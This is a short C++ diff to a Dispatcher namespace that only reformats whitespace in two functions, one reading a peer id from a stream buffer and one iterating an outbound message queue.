@@ -4,8 +4,8 @@ namespace Dispatcher {
     DWORD PeekPeerId(const _stream *const stream) {
 
         uint32_t pid = 0;
-
         x_memcpy(&pid, B_PTR(stream->buffer), 4);
+
         return pid;
     }
 
@@ -116,7 +116,8 @@ namespace Dispatcher {
 
     VOID PrepareEgress(_stream *out) {
 
-        _parser parser  = { };
+        _parser parser = { };
+
         for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
             // todo: prepend outbound messages with 0, inbound with 1
 
